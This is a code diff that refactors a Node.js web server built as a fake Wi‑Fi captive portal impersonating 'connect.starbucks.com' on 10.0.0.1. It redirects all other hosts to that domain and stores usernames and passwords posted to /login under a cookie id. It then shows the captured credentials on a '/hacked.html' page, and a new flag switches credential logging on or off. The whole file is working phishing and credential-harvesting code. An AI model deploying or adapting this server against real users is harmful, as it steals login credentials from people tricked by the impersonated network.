@@ -1,12 +1,23 @@
+// Configuration
+
+const selfAddress = '10.0.0.1';
+const selfPort = 80;
+const logRequests = true;
+const logCredentials = false;
+const domainName = 'connect.starbucks.com';
+
+// Dependencies
+
 const http = require('http');
 const fs = require('fs');
 const uuid = require('uuid');
-const domainName = 'connect.starbucks.com';
-let credentials = {};
+
+// Functions
 
 function handleGet(req, res) {
   if (req.headers.host != domainName) {
-    writeResponse(res, 302, {'Location': 'http://' + domainName + '/'}, 'Loading...');
+    writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
+    'Loading...');
     return;
   }
   let cookies = parseCookies(req.headers.cookie);
@@ -22,42 +33,45 @@ function handleGet(req, res) {
       resource = '/hacked.html';
       break;
   }
-  let resourcePath = __dirname + '/resources' + resource;
-  fs.readFile(resourcePath, (error, contentBuffer) => {
-    if (error) {
-      writeResponse(res, 404, {}, 'Not Found');
-    } else {
-      if (resource == '/hacked.html'
-      && cookies
-      && cookies.id
-      && credentials[cookies.id]
-      && credentials[cookies.id].username
-      && credentials[cookies.id].password) {
-        let contentString = contentBuffer.toString();
-        contentString = contentString.replace('[PLACEHOLDER_USERNAME]', credentials[cookies.id].username);
-        contentString = contentString.replace('[PLACEHOLDER_PASSWORD]', credentials[cookies.id].password);
-        contentBuffer = Buffer.from(contentString, 'utf-8');
+  readResource(resource, () => {
+    writeResponse(res, 404, {}, 'Not Found');
+  }, contentBuffer => {
+    if (resource == '/hacked.html') {
+      if (cookies.id) {
+        if (credentials[cookies.id] && credentials[cookies.id].username
+        && credentials[cookies.id].password) {
+          let contentString = contentBuffer.toString();
+          contentString = contentString.replace('[PLACEHOLDER_USERNAME]',
+          credentials[cookies.id].username);
+          contentString = contentString.replace('[PLACEHOLDER_PASSWORD]',
+          credentials[cookies.id].password);
+          contentBuffer = Buffer.from(contentString, 'utf8');
+        }
         delete credentials[cookies.id];
       }
-      writeResponse(res, 200, {}, contentBuffer);
     }
+    writeResponse(res, 200, {}, contentBuffer);
   });
 }
 
 function handlePost(req, res) {
   if (req.headers.host != domainName) {
-    writeResponse(res, 302, {'Location': 'http://' + domainName + '/'}, 'Loading...');
+    writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
+    'Loading...');
     return;
   }
   let resource = req.url;
   switch (resource) {
     case '/login':
       parseFormData(req, formData => {
-        console.log(formData); // DEBUG
         let id = uuid.v4();
         credentials[id] = {};
         credentials[id] = formData;
-        writeResponse(res, 302, {'Location': '/gg', 'Set-Cookie': 'id=' + id}, 'Loading...');
+        if (logCredentials) {
+          console.log(credentials[id]);
+        }
+        writeResponse(res, 302, { 'Location': '/gg', 'Set-Cookie': 'id=' + id },
+        'Loading...');
       });
       break;
     default:
@@ -66,7 +80,7 @@ function handlePost(req, res) {
   }
 }
 
-function handleUnsupported(req, res) {
+function handleUnsupported(res) {
   writeResponse(res, 400, {}, 'Bad Request');
 }
 
@@ -78,13 +92,21 @@ function writeResponse(res, statusCode, headers, content) {
   res.end(content);
 }
 
+function readResource(resource, errorCallback, successCallback) {
+  fs.readFile(__dirname + '/resources' + resource, (error, contentBuffer) => {
+    if (error) {
+      errorCallback();
+      return;
+    }
+    successCallback(contentBuffer);
+  });
+}
+
 function parseFormData(req, callback) {
   let body = '';
-  req
-  .on('data', chunk => {
+  req.on('data', chunk => {
     body += chunk;
-  })
-  .on('end', () => {
+  }).on('end', () => {
     let searchParams = new URLSearchParams(body);
     let formData = {};
     searchParams.forEach((value, key) => {
@@ -106,8 +128,14 @@ function parseCookies(cookieHeader) {
   return cookies;
 }
 
+// Main script
+
+let credentials = {};
+
 http.createServer((req, res) => {
-  console.log(req.method + ': ' + req.headers.host + req.url);
+  if (logRequests) {
+    console.log(req.method + ': ' + req.headers.host + req.url);
+  }
   switch (req.method) {
     case 'GET':
       handleGet(req, res);
@@ -116,9 +144,9 @@ http.createServer((req, res) => {
       handlePost(req, res);
       break;
     default:
-      handleUnsupported(req, res);
+      handleUnsupported(res);
       break;
   }
-}).listen(80, '10.0.0.1');
+}).listen(selfPort, selfAddress);
 
-console.log('Web server listening on 10.0.0.1:80');
+console.log('HTTP server listening on ' + selfAddress + ':' + selfPort);
